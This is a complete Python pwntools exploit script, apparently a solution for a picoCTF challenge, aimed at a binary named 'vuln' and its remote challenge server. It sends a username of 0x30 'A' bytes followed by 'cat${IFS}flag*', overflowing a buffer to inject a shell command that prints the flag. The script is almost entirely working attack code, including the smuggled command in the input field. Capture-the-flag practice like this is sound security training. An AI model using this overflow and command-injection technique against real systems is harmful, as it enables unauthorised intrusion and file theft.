#!/usr/bin/env python3

from pwn import *

exe = ELF("./vuln")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r)
    else:
        r = remote("amiable-citadel.picoctf.net", 63612)

    return r


def main():
    r = conn()

    r.sendlineafter(b"username: ", b"A" * 0x30 + b"cat${IFS}flag*")
    flag = r.recvlines(2)[-1].decode()
    log.success(f"Flag: {flag}")


if __name__ == "__main__":
    main()
